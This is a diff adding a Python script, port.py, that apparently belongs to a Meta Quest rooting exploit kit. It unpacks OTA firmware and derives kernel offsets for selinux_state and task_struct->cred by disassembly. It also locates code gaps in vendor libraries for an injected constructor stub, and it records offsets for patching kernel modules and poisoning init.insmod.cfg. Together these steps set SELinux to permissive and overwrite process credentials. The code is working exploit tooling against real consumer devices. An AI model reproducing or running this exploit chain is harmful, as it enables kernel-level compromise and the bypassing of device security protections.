@@ -1,0 +1,334 @@
+#!/usr/bin/env python3
+# port.py — gather everything needed for a new firmware target and emit targets/<name>.json.
+#
+#   Quest 3 (two-carrier):  python3 port.py --zip q3_<build>.zip
+#   Quest Pro / Q2 (merged):python3 port.py --zip QPro_<build>.zip --merged --carrier rdbg \
+#                             --inject-lib libgralloc.qti.so --enforcing-off 1 --cred-off 0x7e8
+#   Quest 3S (merged 5.10):  python3 port.py --zip q3s_<build>.zip --merged --carrier llcc_perfmon \
+#                             --inject-lib libcdsprpc.so --cfg-ctor
+#     (Q3S has no usbip cred carrier; llcc's 52B .init.text forces build_credmod's .text-splice, and
+#      the 5.10 cfg isn't shell-readable under Enforcing -> --cfg-ctor. enforcing/cred default to 5.10.)
+#
+# Fully OTA-only — no device needed (carrier/cfg/libs/kernel all come from the zip). --device just
+# speeds it up (skips the 1.2GB system dump by adb-pulling libandroid_servers instead). The target
+# name defaults to the zip's basename (QPro_<build> / q3_<build>).
+#
+# One emitter, both device families. --merged builds the single-carrier shape (rdbg diff-patched by
+# build_credmod into enforcing=0 + status-sync + cred-patch, cfg poisoned shell-direct). Non-merged
+# builds the Q3 two-carrier shape (llcc_perfmon enforcing carrier + usbip-vudc cred carrier).
+# enforcing-off/cred-off are the 4.19-vs-5.10 struct deltas (default to Q3 5.10: 0 / 0x778); confirm
+# them from the device's /sys/kernel/btf/vmlinux (selinux_state.enforcing, task_struct.cred).
+# Needs: payload-dumper-go, debugfs, vmlinux-to-elf, llvm-readelf/nm.
+import argparse, json, os, re, struct, subprocess, sys, tempfile, shutil, atexit
+HERE = os.path.dirname(os.path.abspath(__file__))
+sys.path.insert(0, HERE)
+from toolconf import READELF, NM, OBJDUMP, PDG, DEBUGFS, VMLINUX_TO_ELF   # central tool locations (edit toolconf.py / set env)
+R_AARCH64_CALL26 = 0x11b
+
+def run(args): return subprocess.run(args, capture_output=True, text=True).stdout   # arg list, no shell (OS-independent)
+def die(m): print("ERROR:", m); sys.exit(1)
+
+def dump_partitions(zippath, workdir, parts):
+    import zipfile                                          # extract payload.bin cross-OS (no `unzip`)
+    with zipfile.ZipFile(zippath) as z:
+        z.extract("payload.bin", workdir)
+    subprocess.run([PDG, "-p", ",".join(parts), "-o", workdir,
+                    os.path.join(workdir, "payload.bin")], capture_output=True)
+
+def debugfs_dump(img, inner, outp):
+    subprocess.run([DEBUGFS, "-R", f"dump {inner} {outp}", img], capture_output=True)
+    return os.path.exists(outp) and os.path.getsize(outp) > 0
+
+def carrier_anchor_symbol(ko):
+    # the CALL26 target inside .rela.init.text (this is what build_carrier repoints to 0x14,
+    # so DELTA must be selinux_state - <this symbol>). Ignore CALL26s in other sections (CFI etc).
+    out = run([READELF, "-r", ko])
+    for blk in ("Relocation section '" + s for s in out.split("Relocation section '")[1:]):
+        if blk.startswith("Relocation section '.rela.init.text'"):
+            m = re.search(r"CALL26\s+\S+\s+(\S+)", blk)
+            return m.group(1).split("+")[0].strip() if m else None
+    return None
+
+def lib_from_device_or_zip(name, devpath, dev, workdir, part_imgs, inners):
+    # devpath = on-device path (adb pull, binary-safe); part_imgs/inners = fallback (image, inner-path)
+    local = os.path.join(workdir, name)
+    if dev:
+        subprocess.run(["adb", "-s", dev, "pull", devpath, local], capture_output=True)
+        if os.path.exists(local) and os.path.getsize(local) > 1000: return local
+    for img, inner in zip(part_imgs, inners):
+        if debugfs_dump(img, inner, local): return local
+    return local if os.path.exists(local) and os.path.getsize(local) > 1000 else None
+
+def find_module(workdir, name, imgs):
+    # QPro keeps modules in vendor.img:/lib/modules; Q3 in vendor_dlkm.img:/lib/modules — try both.
+    out = os.path.join(workdir, name + ".ko")
+    for img in imgs:
+        if debugfs_dump(os.path.join(workdir, img), f"/lib/modules/{name}.ko", out): return out
+    return None
+
+def init_array_and_ctor(libeva):
+    d = open(libeva, "rb").read()
+    off = None
+    for l in run([READELF, "-S", libeva]).splitlines():
+        if ".init_array" in l:
+            off = int(l.split()[4], 16); break
+    if off is None: die("no .init_array in libeva")
+    ctor = struct.unpack_from("<Q", d, off)[0]
+    return off, ctor
+
+def find_gap(libeva, need=1720):
+    d = open(libeva, "rb").read()
+    # scan executable PT_LOAD segments for the largest zero run
+    e_phoff, = struct.unpack_from("<Q", d, 0x20)
+    phentsz, phnum = struct.unpack_from("<HH", d, 0x36)
+    best = (0, 0)
+    for i in range(phnum):
+        p = e_phoff + i * phentsz
+        p_type, p_flags = struct.unpack_from("<II", d, p)
+        p_off, = struct.unpack_from("<Q", d, p + 8)
+        p_filesz, = struct.unpack_from("<Q", d, p + 32)
+        if p_type != 1 or not (p_flags & 1): continue          # PT_LOAD + X
+        seg = d[p_off:p_off + p_filesz]
+        zrun = 0
+        for j, b in enumerate(seg):
+            if b == 0:
+                zrun += 1
+                if zrun > best[1]: best = (p_off + j - zrun + 1, zrun)
+            else: zrun = 0
+    start, size = best
+    start = (start + 7) & ~7                                    # 8-byte align
+    size -= (start - best[0])
+    if size < need: die(f"no >= {need}B zero gap in an exec segment (largest {best[1]})")
+    return start, size
+
+def dump_sym(lib, needle):
+    for l in run([READELF, "-sW", lib]).splitlines():
+        if needle in l:
+            f = l.split(); return int(f[1], 16), int(f[2])
+    return None, None
+
+# --- old-kernel "another path": derive data/struct offsets by disassembly ------------------------
+# Old Quest 2 kernels (e.g. 4.19.157 on build 5083785006200150) ship a kallsyms with NO data symbols
+# and NO BTF, so `selinux_state` — the only *data* symbol port.py needs — is missing and vmlinux-to-elf
+# can't recover it. We instead xref it out of the code (its address is baked into every SELinux hook):
+# `avc_has_perm_noaudit(&selinux_state, ...)` passes it as x0, so majority-vote the x0 (adrp+add) across
+# every call site. task_struct->cred can likewise shift across 4.19 point-releases (0x7e0 on 4.19.157
+# vs 0x7e8 on 4.19.325), so we can read it straight out of commit_creds. Both need only llvm-objdump.
+def _objdump(vm):
+    return run([OBJDUMP, "-d", "--no-show-raw-insn", vm]).splitlines()
+
+_INSN = re.compile(r"^\s*([0-9a-f]+):\s+(\w+)\s*(.*)$")
+def _disasm_iter(lines):
+    for l in lines:
+        m = _INSN.match(l)
+        if m:
+            yield int(m.group(1), 16), m.group(2), m.group(3).split("//")[0].strip()
+
+def selinux_state_via_xref(vm, avc_addr):
+    """&selinux_state = the x0 passed to avc_has_perm_noaudit, majority-voted over all call sites.
+    Tracks the running x0 (adrp then add #imm); a bl / mov / ldr into x0 invalidates it."""
+    target = f"{avc_addr:x}"
+    x0_page = x0_val = None
+    votes = {}
+    for _addr, mn, ops in _disasm_iter(_objdump(vm)):
+        if mn == "adrp" and ops.startswith("x0,"):
+            m = re.search(r"0x([0-9a-f]+)", ops); x0_page = int(m.group(1), 16) if m else None; x0_val = None
+        elif mn == "add" and ops.startswith("x0, x0, #"):
+            m = re.match(r"x0, x0, #(-?(?:0x[0-9a-f]+|\d+))(?:, lsl #(\d+))?", ops)
+            if m and x0_page is not None:
+                imm = int(m.group(1), 0) << (int(m.group(2)) if m.group(2) else 0)
+                x0_val = x0_page + imm
+        elif mn == "bl":
+            if ops.split()[0].lstrip("#").rstrip(">").split("<")[0].strip().endswith(target) and x0_val is not None:
+                votes[x0_val] = votes.get(x0_val, 0) + 1
+            x0_page = x0_val = None                 # bl clobbers x0 (return value)
+        elif ops[:3] in ("x0,", "w0,"):             # any other write to x0/w0
+            x0_page = x0_val = None
+    if not votes: return None
+    return max(votes.items(), key=lambda kv: kv[1])[0]
+
+def cred_off_via_commit_creds(vm, cc_addr):
+    """task_struct->cred: commit_creds loads current (mrs SP_EL0) then the adjacent real_cred/cred
+    pointer pair (cred = real_cred + 8). Returns cred offset, or None."""
+    cur = None; ldrs = []
+    for addr, mn, ops in _disasm_iter(_objdump(vm)):
+        if addr < cc_addr: continue
+        if addr > cc_addr + 0x200: break
+        if mn == "mrs" and "SP_EL0" in ops: cur = ops.split(",")[0].strip()
+        elif mn == "ldr" and cur:
+            m = re.search(rf"\[{re.escape(cur)}, #(-?(?:0x[0-9a-f]+|\d+))\]", ops)
+            if m: ldrs.append(int(m.group(1), 0))
+    for a in sorted(set(ldrs)):
+        if a + 8 in ldrs: return a + 8              # real_cred @ a, cred @ a+8
+    return None
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--zip", required=True)
+    ap.add_argument("--name", help="target name (default: the OTA zip's basename, e.g. QPro_<build>)")
+    ap.add_argument("--device"); ap.add_argument("--anchor", default="__platform_driver_register")
+    ap.add_argument("--merged", action="store_true",
+                    help="single-carrier shape (Quest Pro): one module does enforcing=0+cred-patch")
+    ap.add_argument("--carrier", default="llcc_perfmon",
+                    help="enforcing/merged carrier module name (merged: rdbg)")
+    ap.add_argument("--cred-carrier", default="usbip-vudc",
+                    help="Q3 only: not-loaded cred carrier (merged reuses --carrier)")
+    ap.add_argument("--inject-lib", default="libeva.so",
+                    help="trackingservice-mapped same_process_hal_file lib holding the ctor stub "
+                         "(Q3: libeva.so; QPro: libgralloc.qti.so)")
+    ap.add_argument("--enforcing-off", type=lambda x: int(x, 0), default=0,
+                    help="selinux_state.enforcing byte offset (5.10=0, 4.19=1; confirm via BTF)")
+    ap.add_argument("--cred-off", default="0x778",
+                    help="task_struct->cred offset (5.10=0x778, 4.19.325=0x7e8, 4.19.157=0x7e0; "
+                         "'auto' = derive from commit_creds. Always cross-checked against commit_creds.)")
+    ap.add_argument("--cred-security-off", default="0x78",
+                    help="cred->security offset for --adb-root's kernel-context patch (0x78 on 5.10 & 4.19)")
+    ap.add_argument("--cfg-ctor", action="store_true",
+                    help="merged: cfg is NOT shell-readable under Enforcing (Q3 family / Quest 3S) so "
+                         "the init_array ctor poisons it too (2-file). Default (QPro/Q2 4.19): shell-direct.")
+    a = ap.parse_args()
+    a.zip = os.path.abspath(a.zip)   # absolute so it resolves regardless of the scratch workdir
+    # naming scheme: target name == the OTA zip basename (e.g. QPro_51483620027600340, q3_<build>)
+    a.name = a.name or os.path.splitext(os.path.basename(a.zip))[0]
+    tdir = os.path.join(HERE, "targets", a.name); os.makedirs(tdir, exist_ok=True)
+    scratch = os.path.join(HERE, "build"); os.makedirs(scratch, exist_ok=True)   # on disk, not tmpfs
+    wd = tempfile.mkdtemp(prefix="port_", dir=scratch)
+    atexit.register(lambda: shutil.rmtree(wd, ignore_errors=True))               # 1.4GB payload etc.
+    print(f"[*] work dir {wd} (auto-removed on exit)   merged={a.merged}")
+
+    # system (1.2GB) is only needed to pull libandroid_servers from the OTA; skip it if a device is
+    # connected (we adb-pull that lib instead). vendor_dlkm is absent on QPro — payload-dumper skips it.
+    parts = ["boot", "vendor", "vendor_dlkm"] + ([] if a.device else ["system"])
+    print("[*] dumping " + ", ".join(parts) + " ...")
+    dump_partitions(a.zip, wd, parts)
+    IMGS = ["vendor.img", "vendor_dlkm.img"]           # QPro: vendor; Q3: vendor_dlkm — try both
+
+    print(f"[*] extracting carrier ({a.carrier}) + cfg ...")
+    ko = find_module(wd, a.carrier, IMGS)
+    if not ko: die(f"carrier {a.carrier}.ko not found in vendor/vendor_dlkm")
+    shutil.copy(ko, os.path.join(tdir, f"{a.carrier}.ko")); ko = os.path.join(tdir, f"{a.carrier}.ko")
+    cfg = os.path.join(tdir, "init.insmod.cfg")
+    if not (debugfs_dump(os.path.join(wd, "vendor.img"), "/etc/init.insmod.cfg", cfg)
+            or debugfs_dump(os.path.join(wd, "vendor_dlkm.img"), "/etc/init.insmod.cfg", cfg)):
+        die("init.insmod.cfg not found")
+    vermagic = re.search(rb"vermagic=(\S+)", open(ko,"rb").read()).group(1).decode()
+    anchor = a.anchor
+    # the carrier's init must call the anchor (build_credmod/build_carrier repoint that CALL26).
+    car_relas = run([READELF, "-r", ko]).split("rela.init.text", 1)[-1].split("Relocation section", 1)[0]
+    if anchor not in car_relas:
+        print(f"[!] carrier init has no {anchor} CALL26 — pick --anchor from its .rela.init.text")
+    print(f"    carrier vermagic={vermagic}  anchor={anchor}")
+
+    credko = None
+    if not a.merged:
+        credko = find_module(wd, a.cred_carrier, IMGS)
+        if not credko: die(f"cred carrier {a.cred_carrier}.ko not found")
+        shutil.copy(credko, os.path.join(tdir, f"{a.cred_carrier}.ko"))
+        cred_relas = run([READELF, "-r", credko]).split("rela.init.text", 1)[-1].split("Relocation section", 1)[0]
+        if anchor not in cred_relas:
+            print(f"[!] cred carrier init has no {anchor} CALL26 — build_credmod will fail")
+
+    print("[*] vmlinux-to-elf (deltas: selinux_state, find_vpid, pid_task, ssuse) ...")
+    vm = os.path.join(wd, "vmlinux.elf")
+    subprocess.run([VMLINUX_TO_ELF, os.path.join(wd, "boot.img"), vm], capture_output=True)
+    want = ("selinux_state", anchor, "find_vpid", "pid_task", "selinux_status_update_setenforce")
+    # also grab the code symbols used to xref-derive missing data syms on old (data-kallsyms-less) kernels
+    extra = ("avc_has_perm_noaudit", "commit_creds")
+    syms = {}
+    for l in run([NM, vm]).splitlines():
+        f = l.split()
+        if len(f) == 3 and f[2] in want + extra: syms[f[2]] = int(f[0], 16)
+    # selinux_state is a *data* symbol; old kernels (4.19.157 Q2) ship no data kallsyms -> xref it out
+    # of the code instead (friend's tip: it's avc_has_perm_noaudit's first arg). See helper above.
+    if "selinux_state" not in syms and "avc_has_perm_noaudit" in syms:
+        ss = selinux_state_via_xref(vm, syms["avc_has_perm_noaudit"])
+        if ss:
+            syms["selinux_state"] = ss
+            print(f"    [xref] selinux_state not in kallsyms -> {ss:#x} (via avc_has_perm_noaudit callers)")
+    miss = [s for s in want if s not in syms]
+    if miss: die("missing kernel symbols in vmlinux: " + ",".join(miss)
+                 + ("  (selinux_state xref needs avc_has_perm_noaudit)" if "selinux_state" in miss else ""))
+    pdr = syms[anchor]
+    d32 = lambda s: hex((syms[s] - pdr) & 0xffffffff)     # anchor-relative, 32-bit two's complement
+    print(f"    {anchor}={pdr:#x} selinux_state={syms['selinux_state']:#x}")
+    print(f"    dsel={d32('selinux_state')} dfv={d32('find_vpid')} dpt={d32('pid_task')} "
+          f"dssuse={d32('selinux_status_update_setenforce')}")
+
+    # task_struct->cred drifts across 4.19 point-releases (0x7e0 on 4.19.157 vs 0x7e8 on 4.19.325).
+    # Read it out of commit_creds. --cred-off auto = trust the derivation; else cross-check & warn.
+    cc = cred_off_via_commit_creds(vm, syms["commit_creds"]) if "commit_creds" in syms else None
+    if str(a.cred_off).lower() == "auto":
+        if cc is None: die("could not derive cred_off from commit_creds; pass --cred-off explicitly")
+        a.cred_off = hex(cc); print(f"    [derive] task_struct->cred = {a.cred_off} (from commit_creds)")
+    elif cc is not None and cc != int(a.cred_off, 0):
+        print(f"    [!] cred_off cross-check: --cred-off={a.cred_off} but commit_creds reads {hex(cc)} "
+              f"— VERIFY (use --cred-off {hex(cc)} or --cred-off auto if the derivation is right)")
+
+    print(f"[*] inject-lib ({a.inject_lib}) / libandroid offsets ...")
+    ilib = lib_from_device_or_zip(a.inject_lib, f"/vendor/lib64/{a.inject_lib}", a.device, wd,
+                                  [os.path.join(wd, i) for i in IMGS], [f"/lib64/{a.inject_lib}"] * 2)
+    # system.img is system-as-root (rooted at /) so the path inside it is /system/lib64/... ; a device
+    # pull uses the same absolute path. Try both rootings so it works regardless of image layout.
+    libas = lib_from_device_or_zip("libandroid_servers.so", "/system/lib64/libandroid_servers.so",
+                                   a.device, wd, [os.path.join(wd, "system.img")] * 2,
+                                   ["/system/lib64/libandroid_servers.so", "/lib64/libandroid_servers.so"])
+    if not ilib: die(f"could not obtain {a.inject_lib} (not in vendor.img — check --inject-lib name)")
+    if not libas: die("could not obtain libandroid_servers from system.img (was 'system' dumped?)")
+    ia_off, ctor = init_array_and_ctor(ilib)
+    gap_off, gap_sz = find_gap(ilib)
+    dump_off, dump_sz = dump_sym(libas, "NativeInputManager4dumpE")
+
+    # build_incremental: from the device if connected, else from the OTA (system.img build.prop),
+    # else the digits in the zip filename. Keeps porting fully OTA-only (no device required).
+    build = ""
+    if a.device:
+        build = subprocess.run(["adb", "-s", a.device, "shell", "getprop", "ro.build.version.incremental"],
+                               capture_output=True, text=True).stdout.strip()
+    if not build:
+        bp = os.path.join(wd, "build.prop")
+        for inner in ("/system/build.prop", "/build.prop"):
+            if debugfs_dump(os.path.join(wd, "system.img"), inner, bp): break
+        if os.path.exists(bp):
+            m = re.search(r"ro\.build\.version\.incremental=(\S+)", open(bp, errors="replace").read())
+            if m: build = m.group(1)
+    if not build:
+        m = re.search(r"(\d{6,})", os.path.basename(a.zip))   # e.g. QPro_51483620027600340.zip
+        build = m.group(1) if m else "UNKNOWN-set-me"
+    kernel = {"anchor_symbol": anchor, "enforcing_off": a.enforcing_off,
+              "cred_off": a.cred_off, "cred_security_off": a.cred_security_off, "merged": a.merged,
+              "delta_selinux_from_anchor": d32("selinux_state"),
+              "delta_findvpid_from_anchor": d32("find_vpid"),
+              "delta_pidtask_from_anchor": d32("pid_task"),
+              "delta_ssuse_from_anchor": d32("selinux_status_update_setenforce")}
+    tgt = {
+        "name": a.name,
+        "description": f"build {build}, kernel {vermagic}" + (" (MERGED single-carrier)" if a.merged else ""),
+        "device": {"build_incremental": build, "vermagic": vermagic},
+        "dirtyfrag": {"sa_spi": "0xdeadbe10", "writer_spi": "0xdeadbe11", "keymat_base": "0x41"},
+        "kernel": kernel,
+        "carrier": {"device_path": f"/vendor/lib/modules/{a.carrier}.ko",
+                    "local_ko": f"{a.name}/{a.carrier}.ko", "anchor_reloc_off": "0x14"},
+        "inject_lib": {"device_path": f"/vendor/lib64/{a.inject_lib}", "init_array_off": hex(ia_off),
+                       "orig_ctor_off": hex(ctor), "stub_gap_off": hex(gap_off), "stub_gap_size": gap_sz},
+        "libandroid_servers": {"device_path": "/system/lib64/libandroid_servers.so",
+                               "dump_off": hex(dump_off), "dump_size": dump_sz},
+        "cfg": {"device_path": "/vendor/etc/init.insmod.cfg", "local_cfg": f"{a.name}/init.insmod.cfg",
+                "inject_off": "0x21", "inject_len": 54,
+                **({"shell_poison_under_enforcing": True} if (a.merged and not a.cfg_ctor) else {})},
+        "services": {"tracking": "trackingservice", "insmod_sh": "insmod_sh"},
+        "property_socket": "/dev/socket/property_service",
+    }
+    if not a.merged:
+        tgt["cred_carrier"] = {"device_path": f"/vendor/lib/modules/{a.cred_carrier}.ko",
+                               "local_ko": f"{a.name}/{a.cred_carrier}.ko",
+                               "note": f"not-loaded cred carrier; anchor {anchor}"}
+    outp = os.path.join(HERE, "targets", a.name + ".json")
+    json.dump(tgt, open(outp, "w"), indent=2)
+    print(f"\n[+] wrote {outp}\n[+] assets in targets/{a.name}/")
+    print(f"[!] VERIFY: enforcing_off={a.enforcing_off} cred_off={a.cred_off} against the device's "
+          "/sys/kernel/btf/vmlinux (selinux_state.enforcing, task_struct.cred);")
+    print("    cfg.inject_off/len span whole lines >17B before EOF; stub_gap is a zero run;",
+          "offsets came from", "the device" if a.device else "the zip (pass --device for exact)")
+
+if __name__ == "__main__":
+    main()
